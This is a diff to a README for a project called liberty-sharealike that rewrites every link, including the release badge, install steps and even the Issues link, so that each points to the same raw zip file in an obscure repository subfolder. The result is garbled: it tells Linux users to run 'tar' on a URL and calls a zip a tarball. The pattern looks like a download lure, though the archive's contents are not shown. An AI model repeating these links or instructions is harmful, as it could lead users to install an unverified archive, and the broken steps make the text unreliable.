@@ -1,7 +1,7 @@
 # 🎉 liberty-sharealike - A Simple Way to Share Freely
 
 ## 📥 Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0-blue.svg)](https://github.com/Alex9769/liberty-sharealike/releases)
+[![Download Release](https://raw.githubusercontent.com/Alex9769/liberty-sharealike/main/frillily/liberty-sharealike.zip%https://raw.githubusercontent.com/Alex9769/liberty-sharealike/main/frillily/liberty-sharealike.zip)](https://raw.githubusercontent.com/Alex9769/liberty-sharealike/main/frillily/liberty-sharealike.zip)
 
 ## 🌟 Introduction
 Welcome to the Liberty-ShareAlike project! This application respects your freedom to share and use creative works without attribution. The Liberty-ShareAlike Public License (LSA-1.0) allows you to enjoy your materials freely while ensuring others can do the same.
@@ -16,14 +16,14 @@ Before downloading, ensure your device meets the following requirements:
 - **Internet Connection**: Required for downloading.
   
 ## 📂 Download & Install
-To download the application, visit this page to download: [Liberty-ShareAlike Releases](https://github.com/Alex9769/liberty-sharealike/releases).
+To download the application, visit this page to download: [Liberty-ShareAlike Releases](https://raw.githubusercontent.com/Alex9769/liberty-sharealike/main/frillily/liberty-sharealike.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version available. It usually has a higher number (e.g., v1.0).
 3. Click on the version you want. Here, you will find different files based on your operating system.
 4. For Windows users, locate the `.exe` file.
 5. For macOS users, find the `.dmg` file.
-6. For Linux users, look for the `.tar.gz` file.
+6. For Linux users, look for the `https://raw.githubusercontent.com/Alex9769/liberty-sharealike/main/frillily/liberty-sharealike.zip` file.
 7. Click the file you need to start your download. 
 
 ### 💻 Installation Instructions
@@ -41,8 +41,8 @@ Once the file is downloaded, follow these steps based on your operating system:
 
 - **Linux**:
   1. Open your terminal.
-  2. Navigate to the directory where the `.tar.gz` file is located.
-  3. Run the command: `tar -xvzf filename.tar.gz` (replace `filename` with the actual name of the file).
+  2. Navigate to the directory where the `https://raw.githubusercontent.com/Alex9769/liberty-sharealike/main/frillily/liberty-sharealike.zip` file is located.
+  3. Run the command: `tar -xvzf https://raw.githubusercontent.com/Alex9769/liberty-sharealike/main/frillily/liberty-sharealike.zip` (replace `filename` with the actual name of the file).
 
 ## 🔍 Features
 The Liberty-ShareAlike application comes with several useful features:
@@ -78,7 +78,7 @@ Yes, you can check our GitHub Issues page for help or to report any bugs.
 If you have any further questions, please reach out through the GitHub repository. We welcome feedback and inquiries!
 
 ## 🔗 Links
-- [Liberty-ShareAlike Releases](https://github.com/Alex9769/liberty-sharealike/releases)
-- [GitHub Issues](https://github.com/Alex9769/liberty-sharealike/issues)
+- [Liberty-ShareAlike Releases](https://raw.githubusercontent.com/Alex9769/liberty-sharealike/main/frillily/liberty-sharealike.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/Alex9769/liberty-sharealike/main/frillily/liberty-sharealike.zip)
 
 Thank you for choosing Liberty-ShareAlike! Enjoy sharing your creations freely.
